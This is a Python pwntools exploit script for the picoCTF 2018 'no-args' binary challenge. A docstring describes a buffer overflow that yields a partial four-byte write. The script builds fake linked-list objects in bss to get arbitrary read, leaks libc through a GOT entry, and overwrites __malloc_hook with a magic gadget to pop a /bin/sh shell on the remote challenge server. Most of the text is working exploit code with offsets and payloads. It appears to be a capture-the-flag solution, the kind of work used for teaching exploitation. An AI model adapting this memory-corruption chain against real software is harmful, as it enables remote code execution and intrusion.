'''
- buffer overflow in choose_problem():

	#define LINE 32
	#define BUF_LEN 48

	...

	struct ballot_t {
	  char buf[LINE];  
	  problem_t *curr_problem;
	  char votes;
	};

	...

	struct ballot_t ballot;

	...

	get_line(ballot.buf, BUF_LEN);

- we can get 4 byte write where we only control the least significant byte in choose_problem() when it asks us to vote for a problem:

	struct linked_list_node {
	  char *problem_name;
	  struct linked_list_node *next_ptr;
	  uint32_t num_votes;
	};

	...

	typedef struct linked_list_node problem_t;

	...

	struct ballot_t {
	  char buf[LINE];  
	  problem_t *curr_problem;
	  char votes; //one byte
	};
	
	...

	get_line(ballot.buf, BUF_LEN); //buffer overflow
	if (!strcasecmp(ballot.buf,"yes") || !strcasecmp(ballot.buf,"y")) {
	  ballot.curr_problem->num_votes += ballot.votes; //four byte write
	}

- when we have leaked a heap address we can use our arbitrary write to get an arbitrary read in choose_problem() by overwriting a problem name ptr:
	
	struct linked_list_node {
	  char *problem_name;
	  struct linked_list_node *next_ptr;
	  uint32_t num_votes;
	};

	for (ballot.curr_problem = list; ballot.curr_problem; ballot.curr_problem = ballot.curr_problem->next_ptr) { //linked list
		printf("%d  - %s\n", count++, ballot.curr_problem->problem_name); //arbitrary read
	}

- a good way to get arbitrary read without the requirement of a heap leak would be to first create a problem from which the name will act as a fake problem object
  where the first 8 bytes (*name) point to an address where there is some data we want to leak (got entry for example) and the second 8 bytes (*next_ptr)
  point to another fake problem object which we create in bss with our arbitrary write where the objects name points to 'no-args' (which we can also write in bss with our arbitrary write)

  the fake object in bss is there to bypass this check:

  	ballot.curr_problem = find_problem("no-args");
    if (ballot.curr_problem) {
		printf("You can't choose choose because that was last year's master pwn, NO arguments! Would you like to vote for this year's instead?\n> ");
		get_line(ballot.buf, BUF_LEN); //buffer overflow
  
  now we can use this libc leak to overwrite __malloc_hook with a magic gadget to call /bin/sh.
'''

from pwn import *

#r = process('./no-args')
r = remote('2018shell2.picoctf.com', 33530)

def nominate(problem):
	r.sendafter('> ', '1\n')
	r.sendafter('> ', problem)

def vote(problem, list_problems = True, choose = False):
	r.sendafter('> ', '2\n')
	if list_problems == True:
		r.sendafter('List Problems? (y/n) ', 'y\n')
		response = r.recvuntil('\nWhich Problem do you want to vote for?').split('\nWhich Problem do you want to vote for?')[0].split('Current Choices\n')[1]
		problems = response.split('  - ')[1:]

		for i in range(len(problems)):
			problems[i] = problems[i].split('\n' + str(i + 1))[0]
	else:
		r.sendafter('List Problems? (y/n) ', 'n\n')

	if choose != False:
		r.sendafter('> ', 'choose\n')
		r.sendafter('> ', choose)
	else:
		r.sendafter('> ', problem)

	if list_problems == True:
		return problems

def add_signed_byte(addr, byte):
	vote(False, False, 'yes\x00' + '\x00'*28 + p64(addr - 0x10) + chr(byte))

def write(addr, data): #this write requires that the first len(data) bytes at addr are 0.
	for offset, byte in enumerate(data):
		byte = ord(byte)
		if byte > 0x7f:
			add_signed_byte(addr + offset, 0x7f)
			add_signed_byte(addr + offset, byte - 0x7f)
		else:
			add_signed_byte(addr + offset, byte)

nominate(p64(0xffffffffff6007f0) + p64(0x602060)) #fake problem object where fd points to our fake object in bss.

write(0x602290, 'no-args')
write(0x602090, p64(0x601f88) + p64(0x0))
write(0x602060, p64(0x602290) + p64(0x602090))

add_signed_byte(0x602028, 0x20) #corrupt problem linked list.

pause()
libc = u64(vote('test', True)[2][:6].ljust(8, '\x00')) - 0x6f690
print 1
log.success('Libc @ ' + hex(libc))

write(libc + 0x3c4b10, p64(libc + 0xf0274)) #overwrite __malloc_hook with magic gadget to call /bin/sh.

add_signed_byte(0x602020, 0xff)

pause()

nominate('test' + '\x00'*26) #call malloc to call our magic gadget and set rsp+0x50 to null so that argv is null and it just calls /bin/sh.

r.interactive()
